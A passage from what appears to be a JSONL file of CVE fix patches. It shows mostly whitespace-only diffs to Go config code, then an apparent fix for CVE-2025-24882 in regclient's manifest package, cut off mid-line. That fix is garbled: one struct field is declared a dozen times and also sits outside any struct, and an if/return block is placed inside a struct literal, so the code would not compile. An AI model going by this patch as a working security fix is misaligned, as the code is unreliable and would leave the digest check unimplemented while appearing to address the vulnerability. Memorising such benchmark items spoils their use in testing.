&&\n-\t\tc.HTTP.TLS.Cert != \"\" &&\n-\t\tc.HTTP.TLS.CACert != \"\" &&\n-\t\t!c.IsBasicAuthnEnabled() &&\n-\t\t!c.HTTP.AccessControl.AnonymousPolicyExists() {\n-\t\treturn true\n-\t}\n+        if c.HTTP.TLS != nil &&\n+                c.HTTP.TLS.Key != \"\" &&\n+                c.HTTP.TLS.Cert != \"\" &&\n+                c.HTTP.TLS.CACert != \"\" &&\n+                !c.IsBasicAuthnEnabled() &&\n+                !c.HTTP.AccessControl.AnonymousPolicyExists() {\n+                return true\n+        }\n \n-\treturn false\n+        return false\n }\n \n func (c *Config) IsHtpasswdAuthEnabled() bool {\n-\tif c.HTTP.Auth != nil && c.HTTP.Auth.HTPasswd.Path != \"\" {\n-\t\treturn true\n-\t}\n+        if c.HTTP.Auth != nil && c.HTTP.Auth.HTPasswd.Path != \"\" {\n+                return true\n+        }\n \n-\treturn false\n+        return false\n }\n \n func (c *Config) IsBearerAuthEnabled() bool {\n-\tif c.HTTP.Auth != nil &&\n-\t\tc.HTTP.Auth.Bearer != nil &&\n-\t\tc.HTTP.Auth.Bearer.Cert != \"\" &&\n-\t\tc.HTTP.Auth.Bearer.Realm != \"\" &&\n-\t\tc.HTTP.Auth.Bearer.Service != \"\" {\n-\t\treturn true\n-\t}\n+        if c.HTTP.Auth != nil &&\n+                c.HTTP.Auth.Bearer != nil &&\n+                c.HTTP.Auth.Bearer.Cert != \"\" &&\n+                c.HTTP.Auth.Bearer.Realm != \"\" &&\n+                c.HTTP.Auth.Bearer.Service != \"\" {\n+                return true\n+        }\n \n-\treturn false\n+        return false\n }\n \n func (c *Config) IsOpenIDAuthEnabled() bool {\n-\tif c.HTTP.Auth != nil &&\n-\t\tc.HTTP.Auth.OpenID != nil {\n-\t\tfor provider := range c.HTTP.Auth.OpenID.Providers {\n-\t\t\tif isOpenIDAuthProviderEnabled(c, provider) {\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t}\n-\t}\n+        if c.HTTP.Auth != nil &&\n+                c.HTTP.Auth.OpenID != nil {\n+                for provider := range c.HTTP.Auth.OpenID.Providers {\n+                        if isOpenIDAuthProviderEnabled(c, provider) {\n+                                return true\n+                        }\n+                }\n+        }\n \n-\treturn false\n+        return false\n }\n \n func (c *Config) IsAPIKeyEnabled() bool {\n-\tif c.HTTP.Auth != nil && c.HTTP.Auth.APIKey {\n-\t\treturn true\n-\t}\n+        if c.HTTP.Auth != nil && c.HTTP.Auth.APIKey {\n+                return true\n+        }\n \n-\treturn false\n+        return false\n }\n \n func (c *Config) IsBasicAuthnEnabled() bool {\n-\tif c.IsHtpasswdAuthEnabled() || c.IsLdapAuthEnabled() ||\n-\t\tc.IsOpenIDAuthEnabled() || c.IsAPIKeyEnabled() {\n-\t\treturn true\n-\t}\n+        if c.IsHtpasswdAuthEnabled() || c.IsLdapAuthEnabled() ||\n+                c.IsOpenIDAuthEnabled() || c.IsAPIKeyEnabled() {\n+                return true\n+        }\n \n-\treturn false\n+        return false\n }\n \n func isOpenIDAuthProviderEnabled(config *Config, provider string) bool {\n-\tif providerConfig, ok := config.HTTP.Auth.OpenID.Providers[provider]; ok {\n-\t\tif IsOpenIDSupported(provider) {\n-\t\t\tif providerConfig.ClientID != \"\" || providerConfig.Issuer != \"\" ||\n-\t\t\t\tlen(providerConfig.Scopes) > 0 {\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t} else if IsOauth2Supported(provider) {\n-\t\t\tif providerConfig.ClientID != \"\" || len(providerConfig.Scopes) > 0 {\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\treturn false\n+        if providerConfig, ok := config.HTTP.Auth.OpenID.Providers[provider]; ok {\n+                if IsOpenIDSupported(provider) {\n+                        if providerConfig.ClientID != \"\" || providerConfig.Issuer != \"\" ||\n+                                len(providerConfig.Scopes) > 0 {\n+                                return true\n+                        }\n+                } else if IsOauth2Supported(provider) {\n+                        if providerConfig.ClientID != \"\" || len(providerConfig.Scopes) > 0 {\n+                                return true\n+                        }\n+                }\n+        }\n+\n+        return false\n }\n \n func (c *Config) IsMetricsEnabled() bool {\n-\treturn c.Extensions != nil && c.Extensions.Metrics != nil && *c.Extensions.Metrics.Enable\n+        return c.Extensions != nil && c.Extensions.Metrics != nil && *c.Extensions.Metrics.Enable\n }\n \n func (c *Config) IsSearchEnabled() bool {\n-\treturn c.Extensions != nil && c.Extensions.Search != nil && *c.Extensions.Search.Enable\n+        return c.Extensions != nil && c.Extensions.Search != nil && *c.Extensions.Search.Enable\n }\n \n func (c *Config) IsCveScanningEnabled() bool {\n-\treturn c.IsSearchEnabled() && c.Extensions.Search.CVE != nil\n+        return c.IsSearchEnabled() && c.Extensions.Search.CVE != nil\n }\n \n func (c *Config) IsUIEnabled() bool {\n-\treturn c.Extensions != nil && c.Extensions.UI != nil && *c.Extensions.UI.Enable\n+        return c.Extensions != nil && c.Extensions.UI != nil && *c.Extensions.UI.Enable\n }\n \n func (c *Config) AreUserPrefsEnabled() bool {\n-\treturn c.IsSearchEnabled() && c.IsUIEnabled()\n+        return c.IsSearchEnabled() && c.IsUIEnabled()\n }\n \n func (c *Config) IsMgmtEnabled() bool {\n-\treturn c.IsSearchEnabled()\n+        return c.IsSearchEnabled()\n }\n \n func (c *Config) IsImageTrustEnabled() bool {\n-\treturn c.Extensions != nil && c.Extensions.Trust != nil && *c.Extensions.Trust.Enable\n+        return c.Extensions != nil && c.Extensions.Trust != nil && *c.Extensions.Trust.Enable\n }\n \n // check if tags retention is enabled.\n func (c *Config) IsRetentionEnabled() bool {\n-\tvar needsMetaDB bool\n+        var needsMetaDB bool\n \n-\tfor _, retentionPolicy := range c.Storage.Retention.Policies {\n-\t\tfor _, tagRetentionPolicy := range retentionPolicy.KeepTags {\n-\t\t\tif c.isTagsRetentionEnabled(tagRetentionPolicy) {\n-\t\t\t\tneedsMetaDB = true\n-\t\t\t}\n-\t\t}\n-\t}\n+        for _, retentionPolicy := range c.Storage.Retention.Policies {\n+                for _, tagRetentionPolicy := range retentionPolicy.KeepTags {\n+                        if c.isTagsRetentionEnabled(tagRetentionPolicy) {\n+                                needsMetaDB = true\n+                        }\n+                }\n+        }\n \n-\tfor _, subpath := range c.Storage.SubPaths {\n-\t\tfor _, retentionPolicy := range subpath.Retention.Policies {\n-\t\t\tfor _, tagRetentionPolicy := range retentionPolicy.KeepTags {\n-\t\t\t\tif c.isTagsRetentionEnabled(tagRetentionPolicy) {\n-\t\t\t\t\tneedsMetaDB = true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n+        for _, subpath := range c.Storage.SubPaths {\n+                for _, retentionPolicy := range subpath.Retention.Policies {\n+                        for _, tagRetentionPolicy := range retentionPolicy.KeepTags {\n+                                if c.isTagsRetentionEnabled(tagRetentionPolicy) {\n+                                        needsMetaDB = true\n+                                }\n+                        }\n+                }\n+        }\n \n-\treturn needsMetaDB\n+        return needsMetaDB\n }\n \n func (c *Config) isTagsRetentionEnabled(tagRetentionPolicy KeepTagsPolicy) bool {\n-\tif tagRetentionPolicy.MostRecentlyPulledCount != 0 ||\n-\t\ttagRetentionPolicy.MostRecentlyPushedCount != 0 ||\n-\t\ttagRetentionPolicy.PulledWithin != nil ||\n-\t\ttagRetentionPolicy.PushedWithin != nil {\n-\t\treturn true\n-\t}\n+        if tagRetentionPolicy.MostRecentlyPulledCount != 0 ||\n+                tagRetentionPolicy.MostRecentlyPushedCount != 0 ||\n+                tagRetentionPolicy.PulledWithin != nil ||\n+                tagRetentionPolicy.PushedWithin != nil {\n+                return true\n+        }\n \n-\treturn false\n+        return false\n }\n \n func (c *Config) IsCosignEnabled() bool {\n-\treturn c.IsImageTrustEnabled() && c.Extensions.Trust.Cosign\n+        return c.IsImageTrustEnabled() && c.Extensions.Trust.Cosign\n }\n \n func (c *Config) IsNotationEnabled() bool {\n-\treturn c.IsImageTrustEnabled() && c.Extensions.Trust.Notation\n+        return c.IsImageTrustEnabled() && c.Extensions.Trust.Notation\n }\n \n func (c *Config) IsSyncEnabled() bool {\n-\treturn c.Extensions != nil && c.Extensions.Sync != nil && *c.Extensions.Sync.Enable\n+        return c.Extensions != nil && c.Extensions.Sync != nil && *c.Extensions.Sync.Enable\n }\n \n func (c *Config) IsCompatEnabled() bool {\n-\treturn len(c.HTTP.Compat) > 0\n+        return len(c.HTTP.Compat) > 0\n }\n \n func (c *Config) IsEventRecorderEnabled() bool {\n-\treturn c.Extensions != nil && c.Extensions.Events != nil && *c.Extensions.Events.Enable\n+        return c.Extensions != nil && c.Extensions.Events != nil && *c.Extensions.Events.Enable\n }\n \n func IsOpenIDSupported(provider string) bool {\n-\tfor _, supportedProvider := range openIDSupportedProviders {\n-\t\tif supportedProvider == provider {\n-\t\t\treturn true\n-\t\t}\n-\t}\n+        for _, supportedProvider := range openIDSupportedProviders {\n+                if supportedProvider == provider {\n+                        return true\n+                }\n+        }\n \n-\treturn false\n+        return false\n }\n \n func IsOauth2Supported(provider string) bool {\n-\tfor _, supportedProvider := range oauth2SupportedProviders {\n-\t\tif supportedProvider == provider {\n-\t\t\treturn true\n-\t\t}\n-\t}\n+        for _, supportedProvider := range oauth2SupportedProviders {\n+                if supportedProvider == provider {\n+                        return true\n+                }\n+        }\n \n-\treturn false\n+        return false\n }\n"}
{"cve":"CVE-2025-24882:0708", "fix_patch": "diff --git a/types/manifest/common.go b/types/manifest/common.go\nindex 70139b7..1a9a8f7 100644\n--- a/types/manifest/common.go\n+++ b/types/manifest/common.go\n@@ -1,127 +1,140 @@\n package manifest\n \n import (\n-\t\"net/http\"\n-\t\"strconv\"\n-\t\"strings\"\n+        \"net/http\"\n+        \"strconv\"\n+        \"strings\"\n \n-\t// crypto libraries included for go-digest\n-\t_ \"crypto/sha256\"\n-\t_ \"crypto/sha512\"\n+        // crypto libraries included for go-digest\n+        _ \"crypto/sha256\"\n+        _ \"crypto/sha512\"\n \n-\tdigest \"github.com/opencontainers/go-digest\"\n+        digest \"github.com/opencontainers/go-digest\"\n \n-\t\"github.com/regclient/regclient/types\"\n-\t\"github.com/regclient/regclient/types/descriptor\"\n-\t\"github.com/regclient/regclient/types/errs\"\n-\t\"github.com/regclient/regclient/types/ref\"\n+\n+        \"github.com/regclient/regclient/types\"\n+        \"github.com/regclient/regclient/types/descriptor\"\n+        \"github.com/regclient/regclient/types/errs\"\n+        \"github.com/regclient/regclient/types/ref\"\n )\n \n type common struct {\n-\tr         ref.Ref\n-\tdesc      descriptor.Descriptor\n-\tmanifSet  bool\n-\tratelimit types.RateLimit\n-\trawHeader http.Header\n-\trawBody   []byte\n+        r         ref.Ref\n+        desc      descriptor.Descriptor\n+pinned digest.Digest\n+pinned    digest.Digest\n+pinned    digest.Digest\n+pinned    digest.Digest\n+pinned    digest.Digest // for manifest pulls by digest\n+pinned    digest.Digest // for manifest pulls by digest\n+        pinned    digest.Digest\n+pinned    digest.Digest\n+pinned    digest.Digest\n+pinned    digest.Digest\n+manifSet  bool\n+pinned    digest.Digest // for manifest pulls by digest\n+        ratelimit types.RateLimit\n+        rawHeader http.Header\n+        rawBody   []byte\n+pinned    digest.Digest // for manifest pulls by digest\n }\n \n // GetDigest returns the digest\n func (m *common) GetDigest() digest.Digest {\n-\treturn m.desc.Digest\n+        return m.desc.Digest\n }\n \n // GetDescriptor returns the descriptor\n func (m *common) GetDescriptor() descriptor.Descriptor {\n-\treturn m.desc\n+        return m.desc\n }\n \n // GetMediaType returns the media type\n func (m *common) GetMediaType() string {\n-\treturn m.desc.MediaType\n+        return m.desc.MediaType\n }\n \n // GetRateLimit returns the rate limit when the manifest was pulled from a registry.\n // This supports the headers used by Docker Hub.\n func (m *common) GetRateLimit() types.RateLimit {\n-\treturn m.ratelimit\n+        return m.ratelimit\n }\n \n // GetRef returns the reference from the upstream registry\n func (m *common) GetRef() ref.Ref {\n-\treturn m.r\n+        return m.r\n }\n \n // HasRateLimit indicates if the rate limit is set\n func (m *common) HasRateLimit() bool {\n-\treturn m.ratelimit.Set\n+        return m.ratelimit.Set\n }\n \n // IsList indicates if the manifest is a docker Manifest List or OCI Index\n func (m *common) IsList() bool {\n-\tswitch m.desc.MediaType {\n-\tcase MediaTypeDocker2ManifestList, MediaTypeOCI1ManifestList:\n-\t\treturn true\n-\tdefault:\n-\t\treturn false\n-\t}\n+        switch m.desc.MediaType {\n+        case MediaTypeDocker2ManifestList, MediaTypeOCI1ManifestList:\n+                return true\n+        default:\n+                return false\n+        }\n }\n \n // IsSet indicates if the manifest is defined.\n // A false indicates this is from a HEAD request, providing the digest, media-type, and other headers, but no body.\n func (m *common) IsSet() bool {\n-\treturn m.manifSet\n+        return m.manifSet\n }\n \n // RawBody returns the raw body from the manifest if available.\n func (m *common) RawBody() ([]byte, error) {\n-\tif len(m.rawBody) == 0 {\n-\t\treturn m.rawBody, errs.ErrManifestNotSet\n-\t}\n-\treturn m.rawBody, nil\n+        if len(m.rawBody) == 0 {\n+                return m.rawBody, errs.ErrManifestNotSet\n+        }\n+        return m.rawBody, nil\n }\n \n // RawHeaders returns any headers included when manifest was pulled from a registry.\n func (m *common) RawHeaders() (http.Header, error) {\n-\treturn m.rawHeader, nil\n+        return m.rawHeader, nil\n }\n \n func (m *common) setRateLimit(header http.Header) {\n-\t// check for rate limit headers\n-\trlLimit := header.Get(\"RateLimit-Limit\")\n-\trlRemain := header.Get(\"RateLimit-Remaining\")\n-\trlReset := header.Get(\"RateLimit-Reset\")\n-\tif rlLimit != \"\" {\n-\t\tlpSplit := strings.Split(rlLimit, \",\")\n-\t\tlSplit := strings.Split(lpSplit[0], \";\")\n-\t\trlLimitI, err := strconv.Atoi(lSplit[0])\n-\t\tif err != nil {\n-\t\t\tm.ratelimit.Limit = 0\n-\t\t} else {\n-\t\t\tm.ratelimit.Limit = rlLimitI\n-\t\t}\n-\t\tif len(lSplit) > 1 {\n-\t\t\tm.ratelimit.Policies = lpSplit\n-\t\t} else if len(lpSplit) > 1 {\n-\t\t\tm.ratelimit.Policies = lpSplit[1:]\n-\t\t}\n-\t}\n-\tif rlRemain != \"\" {\n-\t\trSplit := strings.Split(rlRemain, \";\")\n-\t\trlRemainI, err := strconv.Atoi(rSplit[0])\n-\t\tif err != nil {\n-\t\t\tm.ratelimit.Remain = 0\n-\t\t} else {\n-\t\t\tm.ratelimit.Remain = rlRemainI\n-\t\t\tm.ratelimit.Set = true\n-\t\t}\n-\t}\n-\tif rlReset != \"\" {\n-\t\trlResetI, err := strconv.Atoi(rlReset)\n-\t\tif err != nil {\n-\t\t\tm.ratelimit.Reset = 0\n-\t\t} else {\n-\t\t\tm.ratelimit.Reset = rlResetI\n-\t\t}\n-\t}\n+        // check for rate limit headers\n+        rlLimit := header.Get(\"RateLimit-Limit\")\n+        rlRemain := header.Get(\"RateLimit-Remaining\")\n+        rlReset := header.Get(\"RateLimit-Reset\")\n+        if rlLimit != \"\" {\n+                lpSplit := strings.Split(rlLimit, \",\")\n+                lSplit := strings.Split(lpSplit[0], \";\")\n+                rlLimitI, err := strconv.Atoi(lSplit[0])\n+                if err != nil {\n+                        m.ratelimit.Limit = 0\n+                } else {\n+                        m.ratelimit.Limit = rlLimitI\n+                }\n+                if len(lSplit) > 1 {\n+                        m.ratelimit.Policies = lpSplit\n+                } else if len(lpSplit) > 1 {\n+                        m.ratelimit.Policies = lpSplit[1:]\n+                }\n+        }\n+        if rlRemain != \"\" {\n+                rSplit := strings.Split(rlRemain, \";\")\n+                rlRemainI, err := strconv.Atoi(rSplit[0])\n+                if err != nil {\n+                        m.ratelimit.Remain = 0\n+                } else {\n+                        m.ratelimit.Remain = rlRemainI\n+                        m.ratelimit.Set = true\n+                }\n+        }\n+        if rlReset != \"\" {\n+                rlResetI, err := strconv.Atoi(rlReset)\n+                if err != nil {\n+                        m.ratelimit.Reset = 0\n+                } else {\n+                        m.ratelimit.Reset = rlResetI\n+                }\n+        }\n }\ndiff --git a/types/manifest/manifest.go b/types/manifest/manifest.go\nindex 1cc93ad..6a94ccf 100644\n--- a/types/manifest/manifest.go\n+++ b/types/manifest/manifest.go\n@@ -3,584 +3,606 @@\n package manifest\n \n import (\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"net/http\"\n-\t\"reflect\"\n-\t\"strconv\"\n-\t\"strings\"\n-\n-\t// Crypto libraries are included for go-digest.\n-\t_ \"crypto/sha256\"\n-\t_ \"crypto/sha512\"\n-\n-\tdigest \"github.com/opencontainers/go-digest\"\n-\n-\t\"github.com/regclient/regclient/types\"\n-\t\"github.com/regclient/regclient/types/descriptor\"\n-\t\"github.com/regclient/regclient/types/docker/schema1\"\n-\t\"github.com/regclient/regclient/types/docker/schema2\"\n-\t\"github.com/regclient/regclient/types/errs\"\n-\t\"github.com/regclient/regclient/types/mediatype\"\n-\tv1 \"github.com/regclient/regclient/types/oci/v1\"\n-\t\"github.com/regclient/regclient/types/platform\"\n-\t\"github.com/regclient/regclient/types/ref\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"net/http\"\n+        \"reflect\"\n+        \"strconv\"\n+        \"strings\"\n+\n+        // Crypto libraries are included for go-digest.\n+        _ \"crypto/sha256\"\n+        _ \"crypto/sha512\"\n+\n+        digest \"github.com/opencontainers/go-digest\"\n+\n+        \"github.com/regclient/regclient/types\"\n+        \"github.com/regclient/regclient/types/descriptor\"\n+        \"github.com/regclient/regclient/types/docker/schema1\"\n+        \"github.com/regclient/regclient/types/docker/schema2\"\n+        \"github.com/regclient/regclient/types/errs\"\n+        \"github.com/regclient/regclient/types/mediatype\"\n+        v1 \"github.com/regclient/regclient/types/oci/v1\"\n+        \"github.com/regclient/regclient/types/platform\"\n+        \"github.com/regclient/regclient/types/ref\"\n )\n \n // Manifest interface is implemented by all supported manifests but\n // many calls are only supported by certain underlying media types.\n type Manifest interface {\n-\tGetDescriptor() descriptor.Descriptor\n-\tGetOrig() interface{}\n-\tGetRef() ref.Ref\n-\tIsList() bool\n-\tIsSet() bool\n-\tMarshalJSON() ([]byte, error)\n-\tRawBody() ([]byte, error)\n-\tRawHeaders() (http.Header, error)\n-\tSetOrig(interface{}) error\n-\n-\t// Deprecated: GetConfig should be accessed using [Imager] interface.\n-\tGetConfig() (descriptor.Descriptor, error)\n-\t// Deprecated: GetLayers should be accessed using [Imager] interface.\n-\tGetLayers() ([]descriptor.Descriptor, error)\n-\n-\t// Deprecated: GetManifestList should be accessed using [Indexer] interface.\n-\tGetManifestList() ([]descriptor.Descriptor, error)\n-\n-\t// Deprecated: GetConfigDigest should be replaced with [GetConfig].\n-\tGetConfigDigest() (digest.Digest, error)\n-\t// Deprecated: GetDigest should be replaced with GetDescriptor().Digest, see [GetDescriptor].\n-\tGetDigest() digest.Digest\n-\t// Deprecated: GetMediaType should be replaced with GetDescriptor().MediaType, see [GetDescriptor].\n-\tGetMediaType() string\n-\t// Deprecated: GetPlatformDesc method should be replaced with [manifest.GetPlatformDesc].\n-\tGetPlatformDesc(p *platform.Platform) (*descriptor.Descriptor, error)\n-\t// Deprecated: GetPlatformList method should be replaced with [manifest.GetPlatformList].\n-\tGetPlatformList() ([]*platform.Platform, error)\n-\t// Deprecated: GetRateLimit method should be replaced with [manifest.GetRateLimit].\n-\tGetRateLimit() types.RateLimit\n-\t// Deprecated: HasRateLimit method should be replaced with [manifest.HasRateLimit].\n-\tHasRateLimit() bool\n+        GetDescriptor() descriptor.Descriptor\n+        GetOrig() interface{}\n+        GetRef() ref.Ref\n+        IsList() bool\n+        IsSet() bool\n+        MarshalJSON() ([]byte, error)\n+        RawBody() ([]byte, error)\n+        RawHeaders() (http.Header, error)\n+        SetOrig(interface{}) error\n+\n+        // Deprecated: GetConfig should be accessed using [Imager] interface.\n+        GetConfig() (descriptor.Descriptor, error)\n+        // Deprecated: GetLayers should be accessed using [Imager] interface.\n+        GetLayers() ([]descriptor.Descriptor, error)\n+\n+        // Deprecated: GetManifestList should be accessed using [Indexer] interface.\n+        GetManifestList() ([]descriptor.Descriptor, error)\n+\n+        // Deprecated: GetConfigDigest should be replaced with [GetConfig].\n+        GetConfigDigest() (digest.Digest, error)\n+        // Deprecated: GetDigest should be replaced with GetDescriptor().Digest, see [GetDescriptor].\n+        GetDigest() digest.Digest\n+        // Deprecated: GetMediaType should be replaced with GetDescriptor().MediaType, see [GetDescriptor].\n+        GetMediaType() string\n+        // Deprecated: GetPlatformDesc method should be replaced with [manifest.GetPlatformDesc].\n+        GetPlatformDesc(p *platform.Platform) (*descriptor.Descriptor, error)\n+        // Deprecated: GetPlatformList method should be replaced with [manifest.GetPlatformList].\n+        GetPlatformList() ([]*platform.Platform, error)\n+        // Deprecated: GetRateLimit method should be replaced with [manifest.GetRateLimit].\n+        GetRateLimit() types.RateLimit\n+        // Deprecated: HasRateLimit method should be replaced with [manifest.HasRateLimit].\n+        HasRateLimit() bool\n }\n \n // Annotator is used by manifests that support annotations.\n // Note this will work for Docker manifests despite the spec not officially supporting it.\n type Annotator interface {\n-\tGetAnnotations() (map[string]string, error)\n-\tSetAnnotation(key, val string) error\n+        GetAnnotations() (map[string]string, error)\n+        SetAnnotation(key, val string) error\n }\n \n // Indexer is used by manifests that contain a manifest list.\n type Indexer interface {\n-\tGetManifestList() ([]descriptor.Descriptor, error)\n-\tSetManifestList(dl []descriptor.Descriptor) error\n+        GetManifestList() ([]descriptor.Descriptor, error)\n+        SetManifestList(dl []descriptor.Descriptor) error\n }\n \n // Imager is used by manifests packaging an image.\n type Imager interface {\n-\tGetConfig() (descriptor.Descriptor, error)\n-\tGetLayers() ([]descriptor.Descriptor, error)\n-\tSetConfig(d descriptor.Descriptor) error\n-\tSetLayers(dl []descriptor.Descriptor) error\n-\tGetSize() (int64, error)\n+        GetConfig() (descriptor.Descriptor, error)\n+        GetLayers() ([]descriptor.Descriptor, error)\n+        SetConfig(d descriptor.Descriptor) error\n+        SetLayers(dl []descriptor.Descriptor) error\n+        GetSize() (int64, error)\n }\n \n // Subjecter is used by manifests that may have a subject field.\n type Subjecter interface {\n-\tGetSubject() (*descriptor.Descriptor, error)\n-\tSetSubject(d *descriptor.Descriptor) error\n+        GetSubject() (*descriptor.Descriptor, error)\n+        SetSubject(d *descriptor.Descriptor) error\n }\n \n type manifestConfig struct {\n-\tr      ref.Ref\n-\tdesc   descriptor.Descriptor\n-\traw    []byte\n-\torig   interface{}\n-\theader http.Header\n+        r      ref.Ref\n+        desc   descriptor.Descriptor\n+        raw    []byte\n+        orig   interface{}\n+        header http.Header\n+pinned digest.Digest\n+pinned    digest.Digest\n+pinned digest.Digest\n+pinned digest.Digest\n+pinned digest.Digest\n+pinned    digest.Digest\n+pinned digest.Digest\n+pinned digest.Digest\n+pinned digest.Digest\n+pinned digest.Digest\n+pinned digest.Digest\n+pinned    digest.Digest // for manifest pulls by digest\n }\n+pinned    digest.Digest // for manifest pulls by digest\n type Opts func(*manifestConfig)\n \n // New creates a new manifest based on provided options.\n func New(opts ...Opts) (Manifest, error) {\n-\tmc := manifestConfig{}\n-\tfor _, opt := range opts {\n-\t\topt(&mc)\n-\t}\n-\tc := common{\n-\t\tr:         mc.r,\n-\t\tdesc:      mc.desc,\n-\t\trawBody:   mc.raw,\n-\t\trawHeader: mc.header,\n-\t}\n-\t// extract fields from header where available\n-\tif mc.header != nil {\n-\t\tif c.desc.MediaType == \"\" {\n-\t\t\tc.desc.MediaType = mediatype.Base(mc.header.Get(\"Content-Type\"))\n-\t\t}\n-\t\tif c.desc.Size == 0 {\n-\t\t\tcl, _ := strconv.Atoi(mc.header.Get(\"Content-Length\"))\n-\t\t\tc.desc.Size = int64(cl)\n-\t\t}\n-\t\tif c.desc.Digest == \"\" {\n-\t\t\tc.desc.Digest, _ = digest.Parse(mc.header.Get(\"Docker-Content-Digest\"))\n-\t\t}\n-\t\tc.setRateLimit(mc.header)\n-\t}\n-\tif mc.orig != nil {\n-\t\treturn fromOrig(c, mc.orig)\n-\t}\n-\treturn fromCommon(c)\n+        mc := manifestConfig{}\n+        for _, opt := range opts {\n+                opt(&mc)\n+        }\n+        c := common{\n+if mc.pinned != \"\" && mc.pinned != c.desc.Digest {\n+return nil, fmt.Errorf(\"manifest digest mismatch, pinned %s, header %s\", mc.pinned, c.desc.Digest)\n+}\n+                r:         mc.r,\n+                desc:      mc.desc,\n+                rawBody:   mc.raw,\n+                rawHeader: mc.header,\n+        }\n+        // extract fields from header where available\n+        if mc.header != nil {\n+                if c.desc.MediaType == \"\" {\n+                        c.desc.MediaType = mediatype.Base(mc.header.Get(\"Content-Type\"))\n+                 if c.pinned != \"\" && c.pinned != c.desc.Digest {\n+return nil, fmt.Errorf(\"manifest digest mismatch, expected %s, computed %s\", c.pinned, c.desc.Digest)\n+}\n+                }\n+                if c.desc.Size == 0 {\n+                        cl, _ := strconv.Atoi(mc.header.Get(\"Content-Length\"))\n+                        c.desc.Size = int64(cl)\n+                }\n+                if c.desc.Digest == \"\" {\n+                        c.desc.Digest, _ = digest.Parse(mc.header.Get(\"Docker-Content-Digest\"))\n+                }\n+                c.setRateLimit(mc.header)\n+        }\n+        if mc.orig != nil {\n+                return fromOrig(c, mc.orig)\n+        }\n+        return fromCommon(c)\n }\n \n // WithDesc specifies the descriptor for the manifest.\n func WithDesc(desc descriptor.Descriptor) Opts {\n-\treturn func(mc *manifestConfig) {\n-\t\tmc.desc = desc\n-\t}\n+        return func(mc *manifestConfig) {\n+                mc.desc = desc\n+        }\n }\n \n // WithHeader provides the headers from the response when pulling the manifest.\n func WithHeader(header http.Header) Opts {\n-\treturn func(mc *manifestConfig) {\n-\t\tmc.header = header\n-\t}\n+        return func(mc *manifestConfig) {\n+                mc.header = header\n+        }\n }\n \n // WithOrig provides the original manifest variable.\n func WithOrig(orig interface{}) Opts {\n-\treturn func(mc *manifestConfig) {\n-\t\tmc.orig = orig\n-\t}\n+        return func(mc *manifestConfig) {\n+                mc.orig = orig\n+        }\n }\n \n // WithRaw provides the manifest bytes or HTTP response body.\n func WithRaw(raw []byte) Opts {\n-\treturn func(mc *manifestConfig) {\n-\t\tmc.raw = raw\n-\t}\n+        return func(mc *manifestConfig) {\n+                mc.raw = raw\n+        }\n }\n \n // WithRef provides the reference used to get the manifest.\n func WithRef(r ref.Ref) Opts {\n-\treturn func(mc *manifestConfig) {\n-\t\tmc.r = r\n-\t}\n+        return func(mc *manifestConfig) {\n+                mc.r = r\n+if r.Digest != \"\" {\n+mc.pinned, _ = digest.Parse(r.Digest)\n+}\n+        }\n }\n \n // GetDigest returns the digest from the manifest descriptor.\n func GetDigest(m Manifest) digest.Digest {\n-\td := m.GetDescriptor()\n-\treturn d.Digest\n+        d := m.GetDescriptor()\n+        return d.Digest\n }\n \n // GetMediaType returns the media type from the manifest descriptor.\n func GetMediaType(m Manifest) string {\n-\td := m.GetDescriptor()\n-\treturn d.MediaType\n+        d := m.GetDescriptor()\n+        return d.MediaType\n }\n \n // GetPlatformDesc returns the descriptor for a specific platform from an index.\n func GetPlatformDesc(m Manifest, p *platform.Platform) (*descriptor.Descriptor, error) {\n-\tif p == nil {\n-\t\treturn nil, fmt.Errorf(\"invalid input, platform is nil%.0w\", errs.ErrNotFound)\n-\t}\n-\tmi, ok := m.(Indexer)\n-\tif !ok {\n-\t\treturn nil, fmt.Errorf(\"unsupported manifest type: %s\", m.GetDescriptor().MediaType)\n-\t}\n-\tdl, err := mi.GetManifestList()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to get manifest list: %w\", err)\n-\t}\n-\td, err := descriptor.DescriptorListSearch(dl, descriptor.MatchOpt{Platform: p})\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"platform not found: %s%.0w\", *p, err)\n-\t}\n-\treturn &d, nil\n+        if p == nil {\n+                return nil, fmt.Errorf(\"invalid input, platform is nil%.0w\", errs.ErrNotFound)\n+        }\n+        mi, ok := m.(Indexer)\n+        if !ok {\n+                return nil, fmt.Errorf(\"unsupported manifest type: %s\", m.GetDescriptor().MediaType)\n+        }\n+        dl, err := mi.GetManifestList()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to get manifest list: %w\", err)\n+        }\n+        d, err := descriptor.DescriptorListSearch(dl, descriptor.MatchOpt{Platform: p})\n+        if err != nil {\n+                return nil, fmt.Errorf(\"platform not found: %s%.0w\", *p, err)\n+        }\n+        return &d, nil\n }\n \n // GetPlatformList returns the list of platforms from an index.\n func GetPlatformList(m Manifest) ([]*platform.Platform, error) {\n-\tmi, ok := m.(Indexer)\n-\tif !ok {\n-\t\treturn nil, fmt.Errorf(\"unsupported manifest type: %s\", m.GetDescriptor().MediaType)\n-\t}\n-\tdl, err := mi.GetManifestList()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to get manifest list: %w\", err)\n-\t}\n-\treturn getPlatformList(dl)\n+        mi, ok := m.(Indexer)\n+        if !ok {\n+                return nil, fmt.Errorf(\"unsupported manifest type: %s\", m.GetDescriptor().MediaType)\n+        }\n+        dl, err := mi.GetManifestList()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to get manifest list: %w\", err)\n+        }\n+        return getPlatformList(dl)\n }\n \n // GetRateLimit returns the current rate limit seen in headers.\n func GetRateLimit(m Manifest) types.RateLimit {\n-\trl := types.RateLimit{}\n-\theader, err := m.RawHeaders()\n-\tif err != nil {\n-\t\treturn rl\n-\t}\n-\t// check for rate limit headers\n-\trlLimit := header.Get(\"RateLimit-Limit\")\n-\trlRemain := header.Get(\"RateLimit-Remaining\")\n-\trlReset := header.Get(\"RateLimit-Reset\")\n-\tif rlLimit != \"\" {\n-\t\tlpSplit := strings.Split(rlLimit, \",\")\n-\t\tlSplit := strings.Split(lpSplit[0], 